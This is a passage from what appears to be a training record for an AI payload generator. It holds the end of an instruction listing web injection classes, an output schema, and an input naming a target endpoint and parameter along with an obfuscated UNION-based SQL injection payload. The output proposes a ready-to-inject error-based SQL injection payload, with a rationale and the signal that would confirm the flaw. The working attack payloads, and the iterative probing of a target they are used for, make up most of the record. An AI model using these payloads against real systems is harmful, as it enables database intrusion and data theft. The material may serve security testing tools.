OM XSS, SQLi\n  (error/boolean/time/union), SSTI, command injection, path traversal, SSRF,\n  open redirect, header injection, deserialization.\n\n## Output\n\nReturn a single JSON object:\n\n```\n{\n  \"payloads\": [\n    {\n      \"payload\": \"string, ready to inject into the parameter\",\n      \"rationale\": \"which hypothesis this tests and why it is next\",\n      \"confirm_signal\": \"the observation that would confirm execution\",\n      \"score\": 0.0-1.0\n    }\n  ]\n}\n```\n\nBest payload first. No prose outside the JSON object.", "input": "Target: /app/target_endpoint/  param=p\nSuspected class: sqli\nLast payload: \"-1'/*!50000UNION*//*!50000SELECT*/1,2,3-- -\"\n  -> scanner_decision=False context=union_based latency=elevated\nPropose the single most informative next payload and the signal that would confirm the vulnerability.", "output": "{\"payloads\": [{\"payload\": \"' AND 1=CONVERT(int,@@version)-- -\", \"rationale\": \"Forces an error-based / UNION disclosure after the previous vector \\\"-1'/*!50000UNION*//*!50000SELECT*/1,2,3-- -\\\" (union_based context, 5005.7 ms, scanner_decision=False) produced no decisive signal.\", \"confirm_signal\": \"a database error disclosing schema/version, or extra UNION-sourced columns/rows appearing in the response\", \"score\": 0.6}]}", "meta": {"endpoint": "/app/target_endpoint/", "param": "p", "label": "sqli"}}
